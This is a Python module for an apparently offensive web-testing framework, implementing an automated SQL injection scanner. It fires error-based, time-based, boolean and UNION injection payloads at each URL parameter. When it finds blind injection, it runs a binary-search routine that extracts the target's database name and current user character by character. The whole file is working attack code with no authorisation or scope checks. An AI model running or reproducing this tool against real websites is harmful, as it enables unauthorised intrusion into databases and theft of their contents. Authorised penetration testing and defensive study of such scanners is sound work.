"""sqli — SQLi scanner with live per-request logging"""
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.http import HttpClient
from core.payloads import get

ERROR_MARKERS = [
    "sql syntax","mysql_fetch","mysqli","pg_query","pg_exec","sqlite3","sqlite_",
    "ora-","microsoft ole db","odbc sql","postgresql","syntax error at or near",
    "sqlstate","unclosed quotation","quoted string not properly terminated",
    "you have an error in your sql","warning: mysql","mysql_num_rows",
    "division by zero","invalid query","sql command not properly ended",
]


class Sqli:
    def run(self, session, logger):
        target = session.target
        http = HttpClient(session, logger)
        u = urlparse(target)
        params = parse_qs(u.query) or {"id": ["1"]}

        waf_present = any(f["kind"] == "waf" for f in session.findings)
        error_payloads = get("sqli", limit=20 if waf_present else 30, mutate_by=0)
        time_payloads = [p for p in get("sqli", mutate_by=0)
                         if any(k in p.lower() for k in ("sleep","waitfor","pg_sleep"))][:4]

        print(f"[sqli] target: {target}")
        print(f"[sqli] param: {list(params.keys())}")
        print(f"[sqli] error: {len(error_payloads)} payloads | time: {len(time_payloads)} payloads")
        print(f"[sqli] ----------")

        findings = []
        vuln_param = None

        for name in params:
            original = params[name][0]

            # === ERROR-BASED ===
            print(f"[error-based] param={name}")
            for idx, p in enumerate(error_payloads, 1):
                r = http.get(self._url(u, params, name, p), label=p)
                if not r:
                    continue
                hit = None
                low = r.text.lower()
                for m in ERROR_MARKERS:
                    if m in low:
                        hit = m
                        break
                if hit:
                    print(f"      ✓ HIT — {hit}", flush=True)
                    findings.append({"param":name,"payload":p,"type":"error","marker":hit})
                    logger.finding("sqli_error","high",f"{name}={p[:60]} marker={hit}")
                    vuln_param = name
            print(f"  · error-based done: {sum(1 for f in findings if f['type']=='error')} hits")

            # === TIME-BASED ===
            print(f"[time-based] param={name}")
            for p in time_payloads:
                t0 = time.time()
                r = http.get(self._url(u, params, name, p), label=f"TIME {p[:30]}")
                dt = time.time() - t0
                if r and dt > 2.5:
                    print(f"      ✓ DELAY — {dt:.2f}s", flush=True)
                    findings.append({"param":name,"payload":p,"type":"time","delay":round(dt,2)})
                    logger.finding("sqli_time","high",f"{name} delay={dt:.2f}s")
                    vuln_param = name
            print(f"  · time-based done: {sum(1 for f in findings if f['type']=='time')} hits")

            # === BOOLEAN ===
            print(f"[boolean] param={name}")
            true_p  = f"{original}' AND '1'='1"
            false_p = f"{original}' AND '1'='2"
            r_t = http.get(self._url(u, params, name, true_p), label="BOOL true")
            r_f = http.get(self._url(u, params, name, false_p), label="BOOL false")
            if r_t and r_f:
                diff = abs(len(r_t.content) - len(r_f.content))
                if diff > 50:
                    print(f"      ✓ DIFF {diff}b")
                    findings.append({"param":name,"type":"boolean","diff":diff})
                    logger.finding("sqli_boolean","high",f"{name} diff={diff}")
                    if not vuln_param: vuln_param = name
                else:
                    print(f"      · no diff ({diff}b)")
            else:
                print(f"      · no response")

            # === UNION ===
            print(f"[union] param={name}")
            for n in range(1, 6):
                marker = f"OMNIUNION{n}X9Z"
                # inject unique marker to verify execution (not just reflection)
                payload = f"{original}' UNION SELECT '{marker}'{',NULL'*(n-1)}-- -"
                r = http.get(self._url(u, params, name, payload), label=f"UNION verify {n}")
                if not r or r.status_code != 200:
                    continue
                # false positive check: payload echoed as text (not executed)
                if payload in r.text or "UNION SELECT" in r.text:
                    print(f"      · col {n}: payload reflected as text (not SQLi)")
                    continue
                # real execution: marker appears in response but payload string doesn't
                if marker in r.text:
                    print(f"      ✓ REAL UNION — {n} cols, marker echoed")
                    findings.append({"param":name,"type":"union","columns":n,"payload":payload})
                    logger.finding("sqli_union","high",f"{name} columns={n}")
                    vuln_param = name
                    break
                else:
                    print(f"      · col {n}: no marker echo")

        print(f"[sqli] ----------")
        print(f"[sqli] total findings: {len(findings)}")
        if vuln_param:
            print(f"[sqli] vulnerable param: {vuln_param}")

        if vuln_param and any(f["type"] in ("boolean","time") for f in findings):
            print(f"\n[sqli] blind injection detected — extracting db info")
            self._blind_dump(http, u, params, vuln_param, logger)

        return {"vulnerable": bool(findings), "findings": findings, "param": vuln_param}

    def _blind_dump(self, http, u, params, param, logger):
        for name, q in [("db_name","SELECT database()"),("db_user","SELECT current_user()")]:
            print(f"[dump:{name}] binary search up to 24 chars", flush=True)
            result = ""
            for pos in range(1, 25):
                char = self._bs_char(http, u, params, param, q, pos)
                if not char or char == 0:
                    break
                result += chr(char)
                print(f"    ... pos {pos}: '{chr(char)}' → '{result}'", flush=True)
            if result.strip():
                print(f"[dump:{name}] = {result.strip()}")
                logger.finding("sqli_dump","critical",f"{name}={result.strip()}")

    def _bs_char(self, http, u, params, param, query, pos):
        lo, hi = 32, 126
        while lo <= hi:
            mid = (lo + hi) // 2
            p1 = f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}-- -"
            p2 = f"' AND ASCII(SUBSTRING(({query}),{pos},1))={mid}-- -"
            r1 = http.get(self._url(u, params, param, p1), label=f"bs p{pos}>{mid}")
            r2 = http.get(self._url(u, params, param, p2), label=f"bs p{pos}={mid}")
            if not (r1 and r2): return 0
            if len(r1.content) > len(r2.content):
                lo = mid + 1
            else:
                hi = mid - 1
        return lo if lo > 32 else 0

    def _url(self, u, params, name, payload):
        q = dict(params); q[name] = [payload]
        return urlunparse(u._replace(query=urlencode(q, doseq=True)))
